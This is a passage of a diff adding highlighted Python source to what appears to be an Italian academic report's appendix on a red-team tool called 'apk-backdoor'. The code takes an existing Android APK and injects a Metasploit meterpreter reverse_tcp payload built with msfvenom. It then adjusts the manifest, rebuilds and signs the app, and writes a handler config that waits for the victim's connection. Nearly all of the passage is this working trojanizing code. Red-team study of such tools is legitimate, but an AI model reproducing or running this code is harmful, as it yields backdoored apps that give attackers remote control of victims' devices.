+<span class="k">def</span> <span class="nf">ip_port_value</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+    <span class="n">ip_pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="nb">compile</span><span class="p">(</span>
+        <span class="s">r"^((?:(?:25[0-5]|2[0-4][0-5]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:(25[0-5]|2[0-4][0-5]|1[0-9][0-9]|[1-9][0-9]|[0-9]))):(\d+?)$"</span><span class="p">)</span>
+    <span class="n">match</span> <span class="o">=</span> <span class="n">ip_pattern</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">match</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentTypeError</span><span class="p">(</span><span class="n">f</span><span class="s">"The value '{string}' is not in the form IP:PORT"</span><span class="p">)</span>
+
+    <span class="n">HostAddress</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'HostAddress'</span><span class="p">,</span> <span class="p">[</span><span class="s">'ip'</span><span class="p">,</span> <span class="s">'port'</span><span class="p">])</span>
+    <span class="k">return</span> <span class="n">HostAddress</span><span class="p">(</span><span class="n">ip</span><span class="o">=</span><span class="n">match</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">port</span><span class="o">=</span><span class="n">match</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
+
+
+<span class="k">def</span> <span class="nf">setup_args</span><span class="p">():</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
+        <span class="n">description</span><span class="o">=</span><span class="s">'Inject a meterpreter backdoor in an existing APK'</span><span class="p">,</span>
+        <span class="n">prog</span><span class="o">=</span><span class="s">'apk-backdoor'</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s">'-v'</span><span class="p">,</span> <span class="s">'--version'</span><span class="p">,</span>
+        <span class="n">action</span><span class="o">=</span><span class="s">'version'</span><span class="p">,</span>
+        <span class="n">version</span><span class="o">=</span><span class="n">f</span><span class="s">"</span><span class="si">%(prog)</span><span class="s">s - v{__version__}"</span>
+    <span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s">'apk'</span><span class="p">,</span>
+        <span class="n">metavar</span><span class="o">=</span><span class="s">'APK'</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s">'The APK where the backdoor will be injected'</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s">'--host'</span><span class="p">,</span> <span class="s">'-H'</span><span class="p">,</span>
+        <span class="n">dest</span><span class="o">=</span><span class="s">'host'</span><span class="p">,</span>
+        <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span>
+        <span class="n">metavar</span><span class="o">=</span><span class="s">'HOST'</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s">'The host (in the form IP:PORT) to which the payload will send data'</span><span class="p">,</span>
+        <span class="nb">type</span><span class="o">=</span><span class="n">ip_port_value</span>
+    <span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s">'--public_host'</span><span class="p">,</span> <span class="s">'-p'</span><span class="p">,</span>
+        <span class="n">dest</span><span class="o">=</span><span class="s">'public_host'</span><span class="p">,</span>
+        <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span>
+        <span class="n">metavar</span><span class="o">=</span><span class="s">'PUBLIC_HOST'</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s">'The host (in the form IP:PORT) to which the payload will send data.'</span>
+             <span class="s">' Use this if HOST is in a private network: REAL_HOST will be the '</span>
+             <span class="s">"router's public IP (and the port that the router will forward to "</span>
+             <span class="s">"the attacker's machine)"</span><span class="p">,</span>
+        <span class="nb">type</span><span class="o">=</span><span class="n">ip_port_value</span>
+    <span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s">'--meterpreter-config'</span><span class="p">,</span> <span class="s">'-m'</span><span class="p">,</span>
+        <span class="n">choices</span><span class="o">=</span><span class="p">[</span><span class="s">'Y'</span><span class="p">,</span> <span class="s">'N'</span><span class="p">],</span>
+        <span class="n">dest</span><span class="o">=</span><span class="s">'write_meterpreter_configuration'</span><span class="p">,</span>
+        <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span>
+        <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="o">.</span><span class="n">upper</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s">'Whether or not a meterpreter configuration file should be written.'</span>
+             <span class="s">"It can then be used with 'msfconsole -r config_file'"</span>
+    <span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s">'-V'</span><span class="p">,</span> <span class="s">'--verbose'</span><span class="p">,</span>
+        <span class="n">dest</span><span class="o">=</span><span class="s">'verbosity'</span><span class="p">,</span>
+        <span class="n">choices</span><span class="o">=</span><span class="p">[</span><span class="s">'CRITICAL'</span><span class="p">,</span> <span class="s">'ERROR'</span><span class="p">,</span> <span class="s">'WARN'</span><span class="p">,</span> <span class="s">'INFO'</span><span class="p">,</span> <span class="s">'DEBUG'</span><span class="p">],</span>
+        <span class="n">default</span><span class="o">=</span><span class="s">'CRITICAL'</span><span class="p">,</span>
+        <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="o">.</span><span class="n">upper</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s">'Verbosity level (between 1 and 5 occurrences with '</span>
+             <span class="s">'more leading to a more verbose logging). '</span>
+             <span class="s">'CRITICAL = 0, ERROR = 1, WARN = 2, INFO = 3, DEBUG = 4.'</span>
+    <span class="p">)</span>
+    <span class="n">log_levels</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">'CRITICAL'</span><span class="p">:</span> <span class="n">logging</span><span class="o">.</span><span class="n">CRITICAL</span><span class="p">,</span>
+        <span class="s">'ERROR'</span><span class="p">:</span> <span class="n">logging</span><span class="o">.</span><span class="n">ERROR</span><span class="p">,</span>
+        <span class="s">'WARN'</span><span class="p">:</span> <span class="n">logging</span><span class="o">.</span><span class="n">WARN</span><span class="p">,</span>
+        <span class="s">'INFO'</span><span class="p">:</span> <span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">,</span>
+        <span class="s">'DEBUG'</span><span class="p">:</span> <span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">,</span>
+    <span class="p">}</span>
+
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+    <span class="n">args</span><span class="o">.</span><span class="n">verbosity</span> <span class="o">=</span> <span class="n">log_levels</span><span class="p">[</span><span class="n">args</span><span class="o">.</span><span class="n">verbosity</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">args</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">utilities</span><span class="o">.</span><span class="n">resize_screen</span><span class="p">()</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">setup_args</span><span class="p">()</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">verbosity</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="s">'apk_backdoor.log'</span><span class="p">,</span> <span class="n">filemode</span><span class="o">=</span><span class="s">'w'</span><span class="p">)</span>
+
+    <span class="n">utilities</span><span class="o">.</span><span class="n">clear_screen</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">Fore</span><span class="o">.</span><span class="n">RED</span> <span class="o">+</span> <span class="n">utilities</span><span class="o">.</span><span class="n">get_title</span><span class="p">(</span><span class="n">center</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">+</span> <span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="p">)</span>
+
+    <span class="k">while</span> <span class="n">args</span><span class="o">.</span><span class="n">host</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">host</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">f</span><span class="s">'{Fore.YELLOW}Set the listener address: '</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">args</span><span class="o">.</span><span class="n">host</span> <span class="o">=</span> <span class="n">ip_port_value</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
+        <span class="k">except</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentTypeError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">Fore</span><span class="o">.</span><span class="n">RED</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="o">+</span> <span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="p">)</span>
+            <span class="n">args</span><span class="o">.</span><span class="n">host</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="k">print</span><span class="p">((</span><span class="s">'-'</span> <span class="o">*</span> <span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="n">center</span><span class="p">(</span><span class="mi">120</span><span class="p">))</span>
+
+    <span class="n">apk</span> <span class="o">=</span> <span class="n">Apk</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">apk</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">Payload</span><span class="p">(</span><span class="n">apk</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">public_host</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">'[ ==== PAYLOAD INJECTION ==== ]'</span><span class="o">.</span><span class="n">center</span><span class="p">(</span><span class="mi">120</span><span class="p">))</span>
+    <span class="n">payload</span><span class="o">.</span><span class="n">inject</span><span class="p">()</span>
+    <span class="n">payload</span><span class="o">.</span><span class="n">delete</span><span class="p">()</span>
+
+    <span class="k">while</span> <span class="n">args</span><span class="o">.</span><span class="n">write_meterpreter_configuration</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">do_write</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">f</span><span class="s">'{Fore.YELLOW}Would you like to save a meterpreter configuration file? [Y/n] '</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">do_write</span> <span class="o">==</span> <span class="s">''</span> <span class="ow">or</span> <span class="n">do_write</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s">'y'</span><span class="p">:</span>
+            <span class="n">ans</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="k">elif</span> <span class="n">do_write</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s">'n'</span><span class="p">:</span>
+            <span class="n">ans</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">ans</span> <span class="o">=</span> <span class="bp">None</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">Fore</span><span class="o">.</span><span class="n">RED</span> <span class="o">+</span> <span class="s">"Please, input either 'y' or 'n' (case insensitive)"</span> <span class="o">+</span> <span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="p">)</span>
+        <span class="n">args</span><span class="o">.</span><span class="n">write_meterpreter_configuration</span> <span class="o">=</span> <span class="n">ans</span>
+
+    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">write_meterpreter_configuration</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'meterpreter.rc'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'use exploit/multi/handler</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'set PAYLOAD android/meterpreter/reverse_tcp</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="s">'set LHOST {args.host.ip}</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="s">'set LPORT {args.host.port}</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'exploit -j -z</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Configuration written to 'meterpreter.rc'"</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">()</span></code></pre>
+</div>
+</div>
+</div>
+<div class="sect3">
+<h4 id="appendix-red-team-tool-payload">A.2.5. File: payload.py</h4>
+<div class="paragraph">
+<p>Questo file gestisce il payload e la sua creazione e iniezione nell&#8217;APK
+originale.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="python"><span class="kn">import</span> <span class="nn">glob</span>
+<span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">shutil</span>
+<span class="kn">import</span> <span class="nn">xml.etree.ElementTree</span> <span class="k">as</span> <span class="n">ET</span>
+
+<span class="kn">from</span> <span class="nn">.</span> <span class="kn">import</span> <span class="n">utilities</span>
+<span class="kn">from</span> <span class="nn">.apk</span> <span class="kn">import</span> <span class="n">Apk</span>
+<span class="kn">from</span> <span class="nn">.utilities</span> <span class="kn">import</span> <span class="n">phase</span>
+
+
+<span class="k">class</span> <span class="nc">Payload</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target_apk</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">public_host</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span> <span class="o">=</span> <span class="bp">None</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">target_apk</span> <span class="o">=</span> <span class="n">target_apk</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">host</span> <span class="o">=</span> <span class="n">host</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">public_host</span> <span class="o">=</span> <span class="n">public_host</span> <span class="k">if</span> <span class="n">public_host</span> <span class="k">else</span> <span class="n">host</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__generate_payload</span><span class="p">()</span>
+
+    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">'Generating the payload'</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">__generate_payload</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">payload_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="s">'payload.apk'</span><span class="p">)</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s">"msfvenom -x {self.target_apk.full_path} -p android/meterpreter/reverse_tcp LHOST={self.public_host.ip} LPORT={self.public_host.port} -o {payload_path}"</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Generating payload...'</span><span class="p">)</span>
+        <span class="n">utilities</span><span class="o">.</span><span class="n">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'    ... Done'</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span> <span class="o">=</span> <span class="n">Apk</span><span class="p">(</span><span class="n">payload_path</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">inject</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__decompile</span><span class="p">()</span>
+        <span class="c1"># self.__decompile_target()
+</span>        <span class="c1"># self.__inject_payload_files()
+</span>        <span class="c1"># self.__get_target_main_activity()
+</span>        <span class="c1"># self.__inject_payload_hook()
+</span>        <span class="bp">self</span><span class="o">.</span><span class="n">__inject_permissions</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span><span class="o">.</span><span class="n">build</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span><span class="o">.</span><span class="n">sign</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__remove_decompiled</span><span class="p">()</span>
+
+    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">'Decompiling the target APK'</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">__decompile_target</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">target_apk</span><span class="o">.</span><span class="n">decompile</span><span class="p">()</span>
+
+    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">"Decompiling the payload's APK"</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">__decompile</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span><span class="o">.</span><span class="n">decompile</span><span class="p">()</span>
+
+    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">"Injecting payload's file in target APK"</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">__inject_payload_files</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">metasploit_package</span> <span class="o">=</span> <span class="s">'com/metasploit/stage'</span>
+        <span class="n">files_to_copy</span> <span class="o">=</span> <span class="n">glob</span><span class="o">.</span><span class="n">glob</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">,</span> <span class="s">'smali/'</span><span class="p">,</span> <span class="n">metasploit_package</span><span class="p">,</span> <span class="s">'*Payload*.smali'</span>
+        <span class="p">))</span>
+        <span class="n">copy_dest</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">target_apk</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">,</span> <span class="s">'smali/'</span><span class="p">,</span> <span class="n">metasploit_package</span><span class="p">)</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">copy_dest</span><span class="p">):</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">"Creating folder: '{copy_dest}'"</span><span class="p">)</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">copy_dest</span><span class="p">)</span>
+        <span class="k">for</span> <span class="nb">file</span> <span class="ow">in</span> <span class="n">files_to_copy</span><span class="p">:</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">"Copying file '{file}' to '{copy_dest}'"</span><span class="p">)</span>
+            <span class="n">shutil</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="n">copy_dest</span><span class="p">)</span>
+
+    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">'Injecting missing permissions'</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">__inject_permissions</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="s">"""
+        :type apk: Apk
+        """</span>
+        <span class="n">ANDROID_NAME</span> <span class="o">=</span> <span class="s">'{http://schemas.android.com/apk/res/android}name'</span>
+        <span class="n">MIN_SDK</span> <span class="o">=</span> <span class="s">'{http://schemas.android.com/apk/res/android}minSdkVersion'</span>
+        <span class="n">TARGET_SDK</span> <span class="o">=</span> <span class="s">'{http://schemas.android.com/apk/res/android}targetSdkVersion'</span>
+        <span class="n">MAX_SDK</span> <span class="o">=</span> <span class="s">'{http://schemas.android.com/apk/res/android}maxSdkVersion'</span>
+
+        <span class="n">target_tree</span> <span class="o">=</span> <span class="n">ET</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">,</span> <span class="s">'AndroidManifest.xml'</span><span class="p">))</span>
+        <span class="c1"># target_permissions = [perm.get(ANDROID_NAME) for perm in target_tree.getroot().findall('uses-permission')]
+</span>        <span class="c1"># target_features = [feat.get(ANDROID_NAME) for feat in target_tree.getroot().findall('uses-feature')]
+</span>
+        <span class="c1"># payload_tree = ET.parse(os.path.join(self.__payload_apk.decompiled_path, 'AndroidManifest.xml'))
+</span>        <span class="c1"># payload_permissions = [perm.get(ANDROID_NAME) for perm in payload_tree.getroot().findall('uses-permission')
+</span>        <span class="c1">#                        if perm.get(ANDROID_NAME) not in target_permissions]
+</span>        <span class="c1"># payload_features = [feat.get(ANDROID_NAME) for feat in payload_tree.getroot().findall('uses-feature')
+</span>        <span class="c1">#                     if feat.get(ANDROID_NAME) not in target_features]
+</span>
+        <span class="c1"># for perm in payload_permissions:
+</span>        <span class="c1">#     logging.debug(f"Adding permission: '{perm}'")
+</span>        <span class="c1">#     permission = ET.SubElement(target_tree.getroot(), 'uses-pemission')
+</span>        <span class="c1">#     permission.set(ANDROID_NAME, perm)
+</span>        <span class="c1"># for feat in payload_features:
+</span>        <span class="c1">#     logging.debug(f"Adding feature: '{feat}'")
+</span>        <span class="c1">#     feature = ET.SubElement(target_tree.getroot(), 'uses-feature')
+</span>        <span class="c1">#     feature.set(ANDROID_NAME, feat)
+</span>
+        <span class="n">sdk</span> <span class="o">=</span> <span class="n">ET</span><span class="o">.</span><span class="n">SubElement</span><span class="p">(</span><span class="n">target_tree</span><span class="o">.</span><span class="n">getroot</span><span class="p">(),</span><span class="s">'uses-sdk'</span><span class="p">)</span>
+        <span class="n">sdk</span><span class="o">.</span><span class="nb">set</span><span class="p">(</span><span class="n">MIN_SDK</span><span class="p">,</span> <span class="s">"22"</span><span class="p">),</span>
+        <span class="n">sdk</span><span class="o">.</span><span class="nb">set</span><span class="p">(</span><span class="n">TARGET_SDK</span><span class="p">,</span> <span class="s">"22"</span><span class="p">)</span>
+        <span class="n">sdk</span><span class="o">.</span><span class="nb">set</span><span class="p">(</span><span class="n">MAX_SDK</span><span class="p">,</span> <span class="s">"29"</span><span class="p">)</span>
+
+        <span class="n">target_tree</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">,</span> <span class="s">'AndroidManifest.xml'</span><span class="p">),</span> <span class="n">xml_declaration</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
+                          <span class="n">encoding</span><span class="o">=</span><span class="s">'utf-8'</span><span class="p">)</span>
+
+    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">"Detecting target's MainActivity"</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">__get_target_main_activity</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">main_activity</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">target_main_activity_file</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">target_apk</span><span class="o">.</span><span class="n">get_main_activity</span><span class="p">()</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">"The main activity is: '{main_activity}'"</span><span class="p">)</span>
+
+    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">"Injecting payload's hook"</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">__inject_payload_hook</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">target_main_activity_file</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s">'Reading from Main Activity file'</span><span class="p">)</span>
+            <span class="n">main_activity_content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+        <span class="n">to_find</span> <span class="o">=</span> <span class="s">';-&gt;onCreate(Landroid/os/Bundle;)V'</span>
+        <span class="n">to_add</span> <span class="o">=</span> <span class="s">'invoke-static {p0}, Lcom/metasploit/stage/Payload;-&gt;start(Landroid/content/Context;)V'</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s">'Inserting the payload invocation in the Main Activity'</span><span class="p">)</span>
+        <span class="n">main_activity_content_lines</span> <span class="o">=</span> <span class="n">main_activity_content</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+        <span class="n">main_activity_content_lines</span><span class="p">[:]</span> <span class="o">=</span> <span class="p">[</span><span class="n">l</span> <span class="k">if</span> <span class="n">to_find</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">l</span> <span class="k">else</span> <span class="n">l</span><span class="o">+</span><span class="s">'    '</span> <span class="o">+</span> <span class="n">to_add</span> <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span>
+                                          <span class="n">main_activity_content_lines</span><span class="p">]</span>
+        <span class="c1">#
+</span>        <span class="c1"># main_activity_content = main_activity_content.replace(to_find, to_find + '\n    ' + to_add)
+</span>        <span class="n">main_activity_content</span> <span class="o">=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">main_activity_content_lines</span><span class="p">)</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">target_main_activity_file</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s">'Writing the Main Activity file'</span><span class="p">)</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">main_activity_content</span><span class="p">)</span>
+
+    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">'Removing decompiled payload'</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">__remove_decompiled</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span><span class="o">.</span><span class="n">remove_decompiled</span><span class="p">()</span>
+
+    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">"Deleting payload's APK"</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">__payload_apk</span><span class="o">.</span><span class="n">full_path</span><span class="p">)</span></code></pre>
+</div>
+</div>
+</div>
+<div class="sect3">
+<h4 id="appendix-red-team-tool-utilities">A.2.6. File: utilities.py</h4>
+<div class="paragraph">
+<p>Questo file contiene delle funzioni e dei decoratori utili al resto del tool.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="python"><span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">import</span> <span class="nn">platform</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
